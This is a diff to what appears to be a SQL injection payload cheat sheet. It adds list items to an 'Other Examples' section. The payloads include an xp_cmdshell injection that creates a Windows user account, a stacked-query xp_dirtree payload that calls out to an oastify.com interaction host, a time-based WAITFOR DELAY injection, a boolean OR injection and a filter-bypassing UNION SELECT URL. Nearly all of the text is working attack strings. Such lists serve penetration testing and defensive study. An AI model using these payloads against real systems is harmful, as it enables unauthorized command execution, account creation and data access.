@@ -265,4 +265,8 @@ http://www.bank.com/accounts.php?id=1+uni%0bon+se%0blect+1,2,3--
 ```
 
 Other Examples
-`/login.asp?username=blah’ or exec master..xp_cmdshell 'net user test testpass --`
+- `/login.asp?username=blah’ or exec master..xp_cmdshell 'net user test testpass --`
+- `select @@servername;`
+- `2026-08-24'; DECLARE @q varchar(99); SET @q = '\\shduybu3ybrh3bjrbw.oastify.com\abc'; EXEC master.dbo.xp_dirtree @q; -- `
+- `=All'%20waitfor%20delay'0%3a0%3a10'--` --> `=All' WAITFOR DELAY '0:0:10'--`
+- `022115369' OR '1253'='1255` --> `022115369'%20or%20'1253'%3d'1255`
